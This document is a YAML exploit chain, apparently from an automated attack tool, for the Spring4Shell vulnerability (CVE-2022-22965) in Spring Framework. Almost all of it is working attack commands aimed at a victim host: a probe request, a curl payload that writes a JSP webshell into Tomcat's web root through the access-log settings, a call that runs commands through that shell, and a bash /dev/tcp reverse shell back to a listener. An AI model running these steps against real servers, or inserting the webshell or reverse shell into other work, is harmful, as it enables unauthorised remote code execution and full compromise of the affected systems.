chain_id: spring4shell_cve_2022_22965
title: "Spring4Shell — CVE-2022-22965 Spring Core RCE via class.module.classLoader"
severity: CRITICAL
tags: [web, spring4shell, cve-2022-22965, spring, rce]

trigger:
  any_of:
    - { kind: "CVE-2022-22965" }
    - { banner_pattern: "(?i)spring\\s*(framework|boot|webmvc)" }
    - { product_pattern: "(?i)spring\\s*(framework|boot)" }

description: |
  Spring Framework < 5.3.18 / 5.2.20 with a JDK 9+ runtime and a Tomcat
  WAR deployment lets an attacker reach `class.module.classLoader` via
  data binding. The canonical exploitation rewrites Tomcat's access
  log pattern to drop a JSP webshell into the docroot.

steps:
  - id: 1
    title: "Probe — the response should be 400 with a stack trace mentioning class.module.classLoader"
    command: |
      curl -i "http://$VICTIMA/?class.module.classLoader.URLs[0]=0"

  - id: 2
    title: "Drop a JSP webshell via the access-log rewrite trick"
    command: |
      curl --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if("j".equals(request.getParameter("pwd"))){ in = %{c2}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } }' \
        --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
        --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT' \
        --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar' \
        --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
        "http://$VICTIMA/"

  - id: 3
    title: "Trigger the shell"
    command: curl "http://$VICTIMA/tomcatwar.jsp?pwd=j&cmd=id"

  - id: 4
    title: "Reverse shell"
    command: |
      nc -lvnp 4444
      curl "http://$VICTIMA/tomcatwar.jsp?pwd=j&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.15%2F4444%200%3E%261%22"

references:
  - https://nvd.nist.gov/vuln/detail/CVE-2022-22965
  - https://github.com/lunasec-io/Spring4Shell-POC
